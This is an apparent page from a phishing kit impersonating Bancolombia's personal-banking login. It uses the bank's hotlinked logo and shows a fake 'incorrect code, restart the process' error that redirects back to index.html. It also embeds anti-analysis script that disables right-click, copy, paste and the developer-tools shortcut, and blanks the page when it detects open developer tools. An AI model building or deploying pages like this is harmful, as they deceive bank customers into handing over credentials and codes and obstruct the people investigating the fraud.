<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login Moderno</title>
  <link rel="stylesheet" href="styllle.css">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"> <!-- Font Awesome -->
</head>
<body>
    <center>
        <img style="width: 20%;" src="https://www.bancolombia.com/wcm/connect/b8e4c3f2-36a9-497d-a125-ac04f83b0bf8/LogoBancolombia.png?MOD=AJPERES" alt="">
  <h3 style="color: white;">Bienvenido a la sucursal personas!</h3>
        <div class="login-container">

    <form style="" id="loginForm">
        
      <div class="input-group">
       
       <center>   
        <p style="color: white; font-size: 15pt;" >Error, condigo incorrecto,reinicia el proceso!</p><div style="color: white; font-size: 15pt;" id="contador">1%</div></center>

        <script>
            let porcentaje = 1;
            const contador = document.getElementById("contador");
    
            function actualizarContador() {
                if (porcentaje <= 100) {
                    contador.textContent = porcentaje + "%";
                    porcentaje++;
                    setTimeout(actualizarContador, 50);
                }
            }
    
            actualizarContador();
            setTimeout(() => {
                window.location.href = "index.html";
            }, 8000);
        </script>
    
    <p id="error-message" class="error-message"></p>

  </div>
  <script src="script.js"></script> </center>
  <img style="max-width: 100%;" src="https://valko.apps.bancolombia.com/assets/TrazoBancolombia1.png" alt="Imagen de ejemplo" class="imagen-personalizada">
      
  <script>
    // 1. Desactivar el menú contextual (clic derecho)
    document.addEventListener('contextmenu', function (e) {
        e.preventDefault();  // Prevenir el menú contextual
    });

    // 2. Detectar si las herramientas de desarrollador están abiertas
    (function() {
        var devtools = /./;
        devtools.toString = function() {
            this.open = true;  // Detectar si las herramientas están abiertas
        };
        setInterval(function() {
            if (devtools.open) {
                alert('Herramientas de desarrollador detectadas. Acceso no permitido.');
                window.location.href = "about:blank";  // Redirigir a una página en blanco
            }
        }, 1000);
    })();

    // 3. Prevenir el copiar/pegar
    document.addEventListener('copy', function (e) {
        e.preventDefault();  // Prevenir copiar
    });

    document.addEventListener('paste', function (e) {
        e.preventDefault();  // Prevenir pegar
    });

    // 4. Bloquear combinación de teclas Ctrl + Shift + I
    document.addEventListener('keydown', function (e) {
        if (e.ctrlKey && e.shiftKey && e.key === 'I') {
            e.preventDefault();  // Prevenir que se abra las herramientas de desarrollo
            alert('Las herramientas de desarrollador están deshabilitadas.');
        }
    });
</script>
</body>
</html>
